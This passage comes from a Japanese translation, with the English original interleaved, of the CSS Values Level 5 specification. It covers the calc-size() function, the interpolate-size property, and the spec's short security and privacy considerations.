When transitioning between two definite sizes, or slightly adjusting an existing definite size, calc() works great: halfway between 100% and 20px is calc(50% + 10px), 20% with a margin of 15px on either side is calc(20% + 15px * 2), etc.
◎
But these operations are no longer possible if the size you want to adjust or transition to/from is an intrinsic size, for both practical and backward-compatibility reasons.＼
</p>

<p>
`calc-size$f 関数は、
内在的~sizeに対し［
安全かつ きちんと定義された仕方で~mathが遂行される
］ことを許容する。
◎
The calc-size() function allows math to be performed on intrinsic sizes in a safe, well-defined way.
</p>

<pre class="prod">
`calc-size()@t
	= calc-size( `calc-size-basis$t, `calc-sum$t )
`calc-size-basis@t
	= `intrinsic-size-keyword$t
	| `percentage$vC
	| `calc-size$f
	| `any$vC
	| `calc-sum$t
</pre>

<p>
`intrinsic-size-keyword@t
生成規則は、
当の文脈において許容される どの`内在的~size$~keywordにも合致する。
例えば， `width$p においては、［
`~autoS$v,
`min-content$v,
`stretch$v,
等々
］に合致する。
◎
The &lt;intrinsic-size-keyword&gt; production matches any intrinsic size keywords allowed in the context. For example, in width, it matches auto, min-content, stretch, etc.
</p>

<p>
~keyword
`percentage@vC
は、
基底s~size `100%^v を指示する。
◎
The percentage basis keyword indicates a basis size of 100%.
</p>

<details class="note">
<summary>
なぜ `calc-size$f は入子にできるか？
◎
Why can calc-size() be nested?
</summary>

<p>
基底s引数【 `calc-size-basis$t 】として `calc-size$f を許容することは、
作者は，基底sとして変数【 `var$f 】を利用できることを意味する
（ `calc-size(var(--foo), size + 20px)^v の様に）
— それは、
当の変数【を`代用する値＠~CSSVAR#substitute-a-var$】が［
元々，当の~prop用の値として妥当である
］限り，`常に働く^emことになる。
◎
Allowing calc-size() as the basis argument means that authors can use a variable as the basis (like calc-size(var(--foo), size + 20px)) and it will always work as long as the variable was originally valid for the property.
</p>

<p>
同じことを `calc$f だけで行っても働かない
— 例えば、
`--foo^p の値に `calc-size(min-content, size + 20px)^v を与えた場合
（あるいは `min-content^v だけを与えた場合でも），
`calc( (var(--foo)) + 20px )^v は失敗する。
◎
Doing the same with just calc() doesn’t work - for example, if you have --foo: calc-size(min-content, size + 20px), or even just --foo: min-content, then calc( (var(--foo)) + 20px ) fails.
</p>

<p>
入子ngは算出d値の時点で単純~化され，消え去るので、
当の基底sは
— 補間や他の効果が生じる時点に先立って —
常に，単独の~keywordになる
— <a href="#simplifying-calc-size">§ `calc-size^f の単純~化-法</a>
を見よ。
◎
The nesting is simplified away at computed-value time, so the basis always ends up as a single keyword by the time interpolation and other effects occur; see § 9.1 Simplifying calc-size().
</p>
</details>

<p>
1 個目の引数は、
`~calc-size基底s@
を与える。
2 個目の引数は、
`~calc-size計算式@
を与える。
どちらも、
`calc-sum$t である場合は
⇒＃
`length-percentage$t に`合致して＠~CSSTOM1#cssnumericvalue-match$いなければナラナイ。
`length$t に解決するモノトスル。
◎
The first argument given is the calc-size basis, and the second is the calc-size calculation.＼
For either argument, if a &lt;calc-sum&gt; is given, its type must match &lt;length-percentage&gt;, and it must resolve to a &lt;length&gt;.
</p>

<p>
`~calc-size基底s$が `any$vC でない場合、
`~calc-size計算式$の中では，~keyword
`size@vC
が許容される。
この~keywordは `length$t であり，
`使用~値$の時点で解決される。
◎
Within the calc-size calculation, if the calc-size basis is not any, the keyword size is allowed. This keyword is a &lt;length&gt;, and resolves at used value time.
</p>

<p>
`calc-size$f は、
ある`内在的~size$を表現する。
特定的に、
それは， `length$t `ではない^em
— `calc-size^f を受容するよう求まれる箇所は，どこであれ、
その文法~内に明示的に含めなければナラナイ。
◎
calc-size() represents an intrinsic size. It is specifically not a &lt;length&gt;; any place that wants to accept a calc-size() must explicitly include it in its grammar.
</p>

<details class="note">
<summary>
なぜ `calc$f 内に内在的~size~keywordを許容するだけは済まないのか？
◎
Why not just allow intrinsic keywords in calc()?
</summary>

<p>
理論~上は、
`calc-size$f を導入することなく
— 補間が通常通り働くことを許容するために —
`calc(auto * .5)^v が妥当になるよう定義することもできた。
◎
In theory, rather than introducing calc-size(), we could have defined calc(auto * .5) to be valid, allowing interpolation to work as normal.
</p>

<p>
が、
これには小さな課題がある：
複数の~keywordを併用することは，依然として許容されないが、
そのことは，さほど明白でない
（すなわち、
`calc((min-content + max-content)/2)^v
は適理に見えるが，許容されない）。
◎
This has the minor issue that mixing keywords still wouldn’t be allowed, but it wouldn’t be as obvious (that is, calc((min-content + max-content)/2) looks reasonable, but would be disallowed).
</p>

<p>
より大きな課題は、
これが百分率を滑らかに遷移することを許容しないことにある。
`calc(50%)^v は、
当の文脈において百分率が`確定的~size$になるときは，
`calc(100%)^v が成す~sizeの半分になるが、
そうでない場合には，通例的に `calc(100%)^v と同じ~sizeになる
（当の文脈に依存して， `0px^v になるか `~autoS$v で~sizeされる）。
◎
The larger issue, tho, is that this wouldn’t allow us to smoothly transition percentages. calc(50%) is only half the size of calc(100%) when percentages are definite in the context; if they’re not, the two values will usually be the same size (depending on the context, either 0px or auto-sized).
</p>

<p>
新たな関数として［
計算-対象の~sizeを計算式~自体から明示的に分離するもの
］を利用すれば、
`すべての事例^emで，滑らかな補間が得られるようになる。
◎
Using a new function that explicitly separates the size you’re calculating with from the calculation itself lets us get smooth interpolation in all cases.
</p>

<p>
追加的な考慮として、［
ある要素が内在的に~sizeされるか確定的になるか
］に依存して，
小さくなったり大きくなるような多くの効果が在る。
`calc$f を利用することは、
“要素は内在的に~sizeされたか？” という問いに対する答えが，
ある遷移の途中と終端で異なることを意味する
（ 【 `min-content^v から `20px^v へ遷移させる事例では，進捗~率 0.8 の時点で：】
途中では `calc(min-content * .2 + 20px * .8))^v になり， “はい” になる一方で、
終端では `calc(20px)^v になり， “いいえ” になる）。
その結果、
他では滑らかな遷移が，終了~時には~layoutが急変するようになる。
◎
An additional consideration is that there are many effects, some small and some large, that depend on whether an element is intrinsically sized or definite. Using calc() would mean that the answer to the question "is the element intrinsically-sized" can have one answer in the middle of a transition ("yes", for calc(min-content * .2 + 20px * .8))), but a different answer at the end of the transition ("no", for calc(20px)), causing the layout to jump at the end of an otherwise-smooth transition.
</p>

<p>
（これは、
`opacity$p を `1^v から `0^v へ~animateするときに生じ得る積層~層の変化に類似する
— `1^v 以外の値は積層~文脈を強制するので。
`opacity$p においては、［
`1^v から視覚的に判別-不能でありながら積層~文脈を強制する `.999^v
］へ~animateすることにより対処できる。
が、
内在的か否かを維持することを確保するために，
`calc(auto * .0001)^v へ~animateするよう人々に依頼することは、
それほど適理ではない。）
◎
(This is similar to the stacking-layer changes that can occur when animating from opacity:1 to opacity: 0; any non-1 value forces a stacking context. With opacity you can get around this by animating to .999, which is visually indistinguishable from 1 but forces a stacking context. It’s not as reasonable to ask people to animate to calc(auto * .0001) to ensure it retains its intrinsic-ness.)
</p>

<p>
`calc-size(auto, 20px)^v の様に，［
自身が`内来的^emに内在的~sizeであるものとして識別される新たな関数
］を利用することは、［
実際の~sizeが確定的~長さであるとき
］でも［
~layoutの挙動が時間~全体にわたり安定になるよう保守できる
］ことを意味する。
◎
Again, using a new function that identifies itself as being inherently an intrinsic size, like calc-size(auto, 20px), means we can maintain stable layout behaviors the entire time, even when the actual size is a definite length.
</p>
</details>

		<section id="simplifying-calc-size">
<h3 title="Simplifying calc-size()">9.1. `calc-size^f の単純~化-法</h3>

<p>
`calc-size$f の`~calc-size計算式$は、
`指定d値$の時点でアリな限り単純~化される
— `~math関数$と類似に，
`~level 4$ の `§ 単純~化＠~CSSVAL#calc-simplification$
にて定義されるとおりに。
◎
At specified value time, the calc-size calculation of a calc-size() is simplified to the extent possible, similar to math functions, as defined in CSS Values 4 § 10.10.1 Simplification
</p>

<p>
`~calc-size計算式$ %計算式 は、
`算出d値$の時点でも再びアリな限り単純~化される。
加えて、
一部の事例では，`~calc-size基底s$ %基底s も単純~化される：
◎
At computed value time, the calc-size calculation is again simplified to the extent possible. In addition, the calc-size basis is simplified in some cases:
</p>
<ul>
	<li>
<p>
%基底s も `calc-size$f 関数 %関数 である場合：
</p>
		<ul>
			<li>
%基底s は、
%関数 の`~calc-size基底s$で置換される。
</li>
			<li>
%関数 の`~calc-size計算式$は、
%計算式 の中へ`代用-$cSされる。
</li>
		</ul>
◎
If the calc-size basis is a calc-size() function itself, the calc-size basis of the outer function is replaced with that of the inner function, and the inner function’s calc-size calculation is substituted into the outer function’s calc-size calculation.
</li>
	<li>
%基底s は `length-percentage$t である場合
⇒
%基底s は，~keyword `percentage$vC に置換される
— それは、
当の `length-percentage$t は`非~百分率~化-$されてから，
%計算式 の中へ`代用-$cSされる。
◎
If the calc-size basis is a &lt;length-percentage&gt;, the calc-size basis is replaced with the keyword percentage and the &lt;length-percentage&gt; is de-percentified, then substituted into the calc-size calculation.
</li>
</ul>

<p>
（上述は、
必要yなら再帰的に遂行される。）
◎
(The above is performed recursively, if necessary.)
</p>

<details class="note">
<summary>
なぜ百分率は，この仕方で単純~化されるか？
◎
Why are percentages simplified in this way?
</summary>

<p>
この百分率~単純~化は、
遷移が線形に働くことを確保する。
◎
This percentage simplification ensures that transitions work linearly.
</p>

<p>
例えば， `100%^v は
— 単純にするため —
`100px^v に等しくなるとする。
◎
For example, say that 100% is 100px, for simplicity.
</p>

<p>
`calc-size(100px, size * 2)^v
（ `200px^v に解決される）
から
`calc-size(50%, size - 20px)^v
（ `30px^v に解決される）
へ［
両~引数（`~calc-size基底s$, `~calc-size計算式$）とも補間してから、
結果の `calc-size^f の［
基底s, 計算式
］に対し，計算式の中へ基底sを代用する
］ことにより遷移させた場合、
中間点では
`calc-size(75px, size * 2 * .5 + (size - 20px) * .5)^v
（ `102.5px^v へ解決される）
になるが，
それは `30px^v から `200px^v までの中間点（ `115px^v ）ではない。
そのように補間すると、
一般に，`二次^emな補間の挙動を与える†。
◎
If you transitioned from `calc-size(100px, size * 2)` (resolves to 200px) to `calc-size(50%, size - 20px)` (resolves to 30px) by interpolating both the arguments, then at the halfway point you’d have `calc-size(75px, size * 2 * .5 + (size - 20px) * .5)` (resolves to 102.5px), which is *not* halfway between 30 and 200 (that would be 115px). Interpolating one argument, then substituting it into another calculation and interpolating that one too, generally gives quadratic interpolation behavior.
</p>

<p class="trans-note">【†
`size$vC ~keywordによる寄与に進捗~率が重ねて乗算され，
結果は進捗~率の二次式になる。
】</p>

<p>
代わりに、
まず，【各 `calc-size^f に対し】基底s引数を計算式~引数の中へ代用する
— その結果
`calc-size(percentage, 100px * 2)^v,
`calc-size(percentage, (size * .5) - 20px)^v
を中間点で補間することで，
`calc-size(percentage, 100px * 2 * .5 + ((size * .5) - 20px) * .5)^v
を取得する
— それは、
期待されるとおり，~~実際に `115px^v に解決される。
遷移における他の地点も類似に線形になる。
◎
Instead, we substitute the basis arg into the calculation arg, so you get `calc-size(percentage, 100px * 2)` and `calc-size(percentage, (size * .5) - 20px)`, and when interpolated, at the halfway point you get `calc-size(percentage, 100px * 2 * .5 + ((size * .5) - 20px) * .5)`, which does indeed resolve to 115px, as expected. Other points in the transition are similarly linear.
</p>
</details>

<div class="algo">
<p>
`~calc-size計算式を非~百分率~化する@
ときは、
所与の
( `~calc-size計算式$ %計算式 )
に対し：
◎
To de-percentify a calc-size calculation calc:
</p>
<ol>
	<li>
<p>
%計算式 を成す
~EACH( `percentage-token$t %百分率~token )
に対し：
</p>
		<ol>
			<li>
%N ~LET %百分率~token の.値 ~DIV 100
</li>
			<li>
%計算式 の中の %百分率~token を `(size * <var>N</var>)^v に置換する
</li>
		</ol>
◎
Replace every instance of a &lt;percentage-token&gt; in calc with (size * N), where N is the percentage’s value divided by 100.＼
</li>
	<li>
~RET %計算式
◎
Return calc.
</li>
</ol>

<p class="note">注記：
例えば、
`50% + 20px^v は `(size * .5) + 20px^v になる。
◎
Note: For example, 50% + 20px becomes (size * .5) + 20px.
</p>
</div>

<div class="algo">
<p>
値 %挿入~値 を`~calc-size計算式$ %計算式 の中へ
`代用-@cS
するときは：
◎
To substitute into a calc-size calculation calc a value insertion value:
</p>

<ol>
	<li>
~IF［
%計算式 内には `size$vC ~keywordは無い
］
⇒
~RET
◎
If calc doesn’t have the size keyword in it, do nothing.
</li>
	<li>
%計算式 内の
各 `size$vC ~keywordを［
丸括弧で括られた %挿入~値
］に置換する
◎
Otherwise, replace every instance of the size keyword in calc with insertion value, wrapped in parentheses.
</li>
	<li>
<p>
~IF［
前段による結果 の %計算式 は，~UA定義な上限を超える値を生産する
］
⇒
%計算式 を利用している~propは`算出d値の時点で無効$になる
◎
If this substitution would produce a value larger than an UA-defined limit, the property the subsitution is happening in becomes invalid at computed-value time.
</p>

<p class="note">注記：
これは、［
変数の代用
］用に定義される［
代用に対する攻撃に抗する保護
］と意図的に一致する
— `CSS-VARIABLES-2$r `§ ~~過度に長い変数の安全な取扱い＠~CSSVAR#long-variables$ を見よ。
しかしながら、
`calc-size$f 値が ごく長くなる利用事例は，`~custom~prop$よりもずっと少ないので、
~UAは，より低い~size上限を課すよう望むかもしれない。
◎
Note: This is intentionally identical to the protection against substitution attacks defined for variable substitution; see CSS Variables 1 § 3.3 Safely Handling Overly-Long Variables. However, the use-cases for very long calc-size() values are much less than for long custom properties, so UAs might wish to impose a smaller size limit.
</p>
	</li>
</ol>
</div>

		</section>
		<section id="resolving-calc-size">
<h3 title="Resolving calc-size()">9.2. `calc-size^f の解決-法</h3>

<p>
`calc-size$f は
— 以下、［
%基底s は その`~calc-size基底s$,
%計算式 は その`~calc-size計算式$
］を指すとする：
◎
↓</p>
<ul>
	<li>
すべてに関して， %基底s であったかのように扱われる
（ `percentage$vC は `100%^v の様に動作する）。
◎
A calc-size() is treated, in all respects, as if it were its calc-size basis. (With percentage acting like 100%.)
</li>
	<li>
しかしながら，実際に~layout計算を遂行するときには、
%基底s が表現する~sizeは，
%計算式 の値へ改変される
— %計算式 内の各 `size$vC ~keywordを［
%基底s の元の~size
］に評価する下で。
◎
When actually performing layout calculations, however, the size represented by its calc-size basis is modified to be the value of its calc-size calculation, with the size keyword evaluating to the calc-size basis’s original size.
</li>
	<li>
%基底s が
`any@vC
をとる場合、［
%計算式 に等しい長さ
］を与える`確定的~size$になる。
◎
(If the calc-size basis is any, the calc-size() is a definite length, equal to its calc-size calculation.)
</li>
</ul>

<div class="example">
<p>
例えば，
`height: calc-size(auto, size + 20px)$p を伴う要素は、
`height: auto^p を伴う要素と同じに扱われるが，
その結果は `20px^v 高くなる。
◎
For example, an element with height: calc-size(auto, size + 20px) will be treated identically to an element with height: auto, but will end up being 20px taller.
</p>
</div>

<p>
`~calc-size計算式$を評価するときは、［
所与の文脈において百分率は確定的でない場合
］には `0px^v 解決され，
他の場合は通常通り解決される。
◎
When evaluating the calc-size calculation, if percentages are not definite in the given context, they resolve to 0px. Otherwise, they resolve as normal.
</p>

<p>
（ `~calc-size基底s$における百分率の扱いは他と異なる：
`単純~化＠#simplifying-calc-size$は、
百分率を`~calc-size計算式$の中へ移動すると伴に，それを `size$vC 参照で置換する。
その結果，`~calc-size基底s$は、
`percentage$vC になる
— それは、
当の文脈において，通常に百分率の様に動作する。
それが［
場合によっては、
~propは`~autoとして挙動する$
］ようになる場合, 等々も含めて —
確定的になるか否かに関わらず。）
◎
(A percentage in the calc-size basis is treated differently; simplification moves the percentage into the calc-size calculation and replaces it with size references. The calc-size basis then becomes percentage, which acts like percentages would normally in that context regardless of definite-ness, including possibly making a property behave as auto, etc.)
</p>

<div class="note">
<p>注記：
基底sにおける百分率は，通常通り働くので、
常に，`どの~size^emへも
— その値や挙動に関わらず —
滑らかに遷移させれる。
例えば、
`calc-size$f を伴わない下で，
`100%^v から `0px^v へ遷移する場合、
それが滑らかに働くのは，百分率が`確定的~size$である場合に限られる
— そうでない場合，
当の~propは遷移~全体にわたって`~autoとして挙動する$かもしれず、
その場合，~sizeは実際には まったく変化しなくなる。
◎
Percentages in the basis work as normal so you can always smoothly transition to any size, regardless of its value or behavior. For example, without calc-size(), transitioning from 100% to 0px only works smoothly if the percentage is definite; if it’s not, then during the entire transition the property might behave as auto and not actually change size at all.
</p>

<p>
他方、
計算式における百分率は，不定なときには 0 へ解決される
— `calc-size$f が 2 つの異なる仕方で動作するようになり得ることを避けるため。
`min-content$v ~sizeと `100%^v ~sizeで~layout効果が異なる結果になる事例もあり、
そこでの `calc-size^f は，どちらか一方として装う必要がある。
◎
Percentages in the calculation, on the other hand, are resolved to 0 when indefinite to avoid making the calc-size() potentially act in two different ways; there are some cases where a min-content size will cause different layout effects than a 100% size, and so a calc-size() has to masquerade as one or the other.
</p>
</div>

		</section>
		<section id="interp-calc-size">
<h3 title="Interpolating calc-size()">9.3. `calc-size^f の補間-法</h3>

<p>
2 個の `calc-size$f 関数は、
双方の`~calc-size基底s$が（`単純~化＠#simplifying-calc-size$の後に）
~OR↓ を満たす場合に補間できる：
◎
Two calc-size() functions can be interpolated if (after simplification):
</p>
<ul>
	<li>
どちらも同じ `intrinsic-size-keyword$t である場合
⇒
結果の`~calc-size基底s$は、
その~keywordになる。
◎
both calc-size basises are the same &lt;intrinsic-size-keyword&gt;
• The result’s calc-size basis is that keyword
</li>
	<li>
どちらかが `any$vC をとる場合
⇒
結果の`~calc-size基底s$は、［
どちらも `any^v をとる場合は `any^v ／
他の場合は `any^v でない方
］になる。
◎
either calc-size basis is any
• The result’s calc-size basis is the non-any basis (or any if both are).
</li>
</ul>

<p>
結果の`~calc-size計算式$は、
双方の入力`~calc-size計算式$の補間になる。
◎
The result’s calc-size calculation is the interpolation of the two input calc-size calculations.
</p>

<p class="note">注記：
補間に対する これらの制約は、［
`calc-size$f は，同時に 2 つの異なる仕方で動作するよう試行しない
］ことを確保する。
例えば，［
`min-content$v, `max-content$v
］が~layoutに対し異なる挙動を生産する事例もあるので、
`calc-size^f は，どちらか一方として装う必要がある。
あいにく，このことは、
`~autoS$v から `min-content^v へ行く様な~keywordどうしでは遷移し得ないことを意味する。
◎
Note: These interpolation restrictions ensure that a calc-size() doesn’t try to act in two different ways at once; there are some cases where a min-content and max-content would produce different layout behaviors, for example, so the calc-size() has to masquerade as one or the other. This, unfortunately, means you can’t transition between keywords, like going from auto to min-content.
</p>

<p>
`calc-size$f 値には［
`length-percentage$t ／ `intrinsic-size-keyword$t
］値 %値 と補間できるものもある。
［
これらの値を補間できるかどうか, できる場合の補間の挙動
］を決定するときは、
%値 を［
%値 は `calc-sum$t である場合は
<code class="value">calc-size(`any$vC, %値 )</code> ／
~ELSE_
<code class="value">calc-size( %値, `size$vC)</code>
］として扱う下で，上の規則を適用する。
◎
Some calc-size() values can also be interpolated with a &lt;length-percentage&gt; or an &lt;intrinsic-size-keyword&gt;. To determine whether the values can interpolate and what the interpolation behavior is, treat the non-calc-size() value as calc-size(any, value ) if the value is a &lt;calc-sum&gt; or as calc-size( value , size) otherwise, and apply the rules above.
</p>

<div class="example">
<p>
例えば、
`height$p においては，
`calc-size$f と `auto^v の補間は許容される：
◎
For example, calc-size() allows interpolation to/from height: auto:
</p>

<pre class="lang-css">
details {
  transition: height 1s;
}
details::details-content {
  display: block;
}
details[open]::details-content {
  height: auto;
}
details:not([open])::details-content {
  height: calc-size(any, 0px);
}
</pre>

<p>
これは、
暗黙的に［
`calc-size(auto, size)^v, `calc-size(any, 0px)^v
］の合間を補間することになる。
`details$e を開いてから 0.5 秒~後には、
`details-content^pe† の `height$p は，
開な~sizeの半分 `calc-size(auto, size * .5)^v になり、
その縦幅は，遷移~全体を通して滑らかに~animateすることになる。
◎
This will implicitly interpolate between calc-size(auto, size) and calc-size(any, 0px). Half a second after opening the details, the ::details-content wrapper’s height will be calc-size(auto, size * .5), half its open size; thruout the transition it’ll smoothly animate its height.
</p>

<p class="trans-note">【†
この疑似要素を定義する仕様は現時点では無いが、［
`details$e 要素の要約（ `summary^e ）以外を成す部分を包装する~box
］になることが意図されると思われる。
】</p>
</div>

<p class="note">注記：
`calc-size$f は、
<code class="value">calc-size(any, `確定的~size$)</code> と他の何かの間で
— “他の何か” がどう指定されたかに関わらず —
`常に^em滑らかに遷移することになるよう設計された。
◎
Note: calc-size() is designed such that transitioning to/from calc-size(any, definite length) will always work smoothly, regardless of how the other side of the transition is specified.
</p>

<p class="issue">
あるいは、
単に［
一方の~sizeに `calc-size$f が明示的に利用されていない場合
］でも［
~keywordと固定的な長さの合間で直な補間を許容すること
］と互換になる【よう設計されたと言える】か？
そうなれば うれしいが、
互換性の分析が要求される。
◎
Or is it compatible to just allow direct interpolation between keywords and fixed lengths, even without an explicit calc-size() being used on one size? This would be nice, but compat analysis is required.
</p>

		</section>
		<section id="interpolate-size">
<h3 title="Interpolating sizing keywords: the interpolate-size property">9.4. ~sizing~keywordの補間-法： `interpolate-size^p ~prop</h3>

<p class="note">注記：
過去に戻れたなら、
この~propは必要なかった。
これが存在するのは、
既存の多くの~stylesheetが［
内在的~sizing~keyword（ `~autoS$v, `min-content$v, 等々）は~animateし得ない
］ものと見做すからである。
したがって，この~propは、［
~stylesheetが，期待される挙動を取得するよう選ぶ
］ことを許容するために存在する。
根~要素に `interpolate-size:allow-keywords$p を指定した場合、
~page全体~用に新たな挙動を選ぶことになる。
互換性が課題にならないときは、
そうすることが示唆される。
◎
Note: If we had a time machine, this property wouldn’t need to exist. It exists because many existing style sheets assume that intrinsic sizing keywords (such as auto, min-content, etc.) cannot animate. Therefore this property exists to allow style sheets to choose to get the expected behavior. Specifying interpolate-size: allow-keywords on the root element chooses the new behavior for the entire page. We suggest doing this whenever compatibility isn’t an issue.
</p>

◎名 `interpolate-size@p
◎値 `numeric-only$v | `allow-keywords$v
◎初 `numeric-only$v
◎適 すべての要素
◎継 される
◎百 受容しない
◎算 指定されたとおり
◎順 文法に従う
◎ア ~animate不可
◎表終

<dl>
	<dt>`numeric-only@v</dt>
	<dd>
`intrinsic-size-keyword$t は、
補間できない。
◎
An &lt;intrinsic-size-keyword&gt; cannot be interpolated.
</dd>

	<dt>`allow-keywords@v</dt>
	<dd>
`intrinsic-size-keyword$t は、
`length-percentage$t との間で補間できる。
これは、
`intrinsic-size-keyword$t %~keyword を `calc-size(<var>keyword</var>, size)^v であったかのように扱う下で，
`calc-size$f の`補間-法＠#interp-calc-size$を適用することにより行われる。
他の値とは，依然として補間できない。
◎
Two values can be interpolated if one of them is an &lt;intrinsic-size-keyword&gt; and the other is a &lt;length-percentage&gt;. This is done by treating the &lt;intrinsic-size-keyword&gt; keyword as though it is calc-size(keyword, size) and applying the rules in § 9.3 Interpolating calc-size(). In other cases, an &lt;intrinsic-size-keyword&gt; still cannot be interpolated.
</dd>
</dl>

<p>
`interpolate-size$p の値が関わるのは、
~animationが開始するかもしれない時点における当の要素の【他の~prop】の算出d値である。
~CSS遷移~用には、
これは，`変化-後~style$における値を意味する。
~animationは、
後で `interpolate-size^p が変化しても［
停止される／開始される
］ことはない。
◎
The value of interpolate-size that matters is the computed value on the element at the time the animation might start. For CSS transitions, this means the value in the after-change style. An animation is not stopped or started later because interpolate-size changes.
</p>

		</section>
	</section>
	<section id="acknowledgments">
<h2 title="Acknowledgments">謝辞</h2>

<p>
まずは、
以前の~levelまでに対する`すべての貢献者たち＠~CSSVAL#acknowledgments$に感謝する。
◎
Firstly, the editors would like to thank all of the contributors to the previous level of this module.
</p>

<p>
~commentと示唆を寄せられ，この~level 5 を改善した
`L. David Baron^en,
`Mike Bremford^en
各氏にも感謝する。
◎
Secondly, we would like to acknowledge L. David Baron and Mike Bremford for their comments and suggestions, which have improved Level 5.
</p>

	</section>
	<section id="changes">
<h2 title="Changes">変更点</h2>

<dl>
	<dt id="changes-recent">
近過去な変更点
◎
Recent Changes
</dt>
	<dd>
（これは、`~level 4 からの追加＠#additions-L4$の下位集合を成す。）
◎
(This is a subset of Additions Since Level 4.)
</dd>

	<dt id="additions-L4">
`~level 4$ からの追加
◎
Additions Since Level 4
◎
Additions since CSS Values and Units Level 4:
</dt>
	<dd>
`toggle$f 記法, `attr$f 記法を追加した。
◎
Added the toggle() and attr() notations
</dd>
</dl>

	</section>
	<section id="sec-pri">
<h2 title="Security and Privacy Considerations">~security／~privacyの考慮点</h2>

<p>
この仕様は、
ほぼ各~CSS仕様に共通な単位を定義するだけなので，
~securityの懸念は無い。
◎
This specification mostly just defines units that are common to CSS specifications, and which present no security concerns.
</p>

<p class="note">注記：
~URLの取扱いには、
~securityの懸念はあるか？
おそらく。
◎
Note: Does URL handling have a security concern? Probably.
</p>

<p>
この仕様は、
利用者の［
~screen~size, 既定の~font~size
］を公開する単位を定義するが、
どちらも~JSから自明に観測-可能なので，
新たな~privacy~riskを成すことはない。
◎
This specification defines units that expose the user’s screen size and default font size, but both are trivially observable from JS, so they do not constitute a new privacy risk.
</p>

<p>
`attr$f 関数は、
~HTML属性~値を~CSS値に利用することを許容する
— それは、［
これまで~CSSを介して~access可能ではなかった敏感な情報
］を公開するものになり得る。
`§ ~security＠#attr-security$
を見よ。
◎
The attr() function allows HTML attribute values to be used in CSS values, potentially exposing sensitive information that was previously not accessible via CSS. See § 6.4.3 Security.
</p>

	</section>
</main></div>

